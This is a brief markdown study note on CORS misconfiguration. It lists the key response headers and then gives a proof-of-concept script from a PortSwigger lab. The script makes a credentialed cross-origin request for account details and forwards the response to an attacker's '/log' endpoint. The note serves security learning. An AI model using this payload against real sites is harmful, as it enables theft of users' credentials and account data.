# Cross-Origin Resource Sharing
A browser mechanishm that enables controlled access to resources located outside of a domain. 

When it is badly implemented, it might cause vulnerabilities. 

There are some policies that manage what resources are allowed. These are the most important response headers that can enable special policies:
- [Access-Control-Allow-Origin](https://developer.mozilla.org/en-US/docs/Web/HTTP/Headers/Access-Control-Allow-Origin): * | \<origin> | null
- [Access-Control-Allow-Credentials](https://developer.mozilla.org/en-US/docs/Web/HTTP/Headers/Access-Control-Allow-Credentials): true
- [Cross-Origin-Resource-Policy](https://developer.mozilla.org/en-US/docs/Web/HTTP/Headers/Cross-Origin-Resource-Policy): same-site | same-origin | cross-origin




## Proof of Concepts

(lab 1, of portswigger CORS learning path)
```html
<script>
    var req = new XMLHttpRequest();
    req.onload = reqListener;
    req.open('get','https://vulnerable-website.com/accountDetails',true);
    req.withCredentials = true;
    req.send();

    /* Send a requests to /log, to let the attacker read the response */
    function reqListener() {
        location='/log?key='+this.responseText;
    };
</script>
```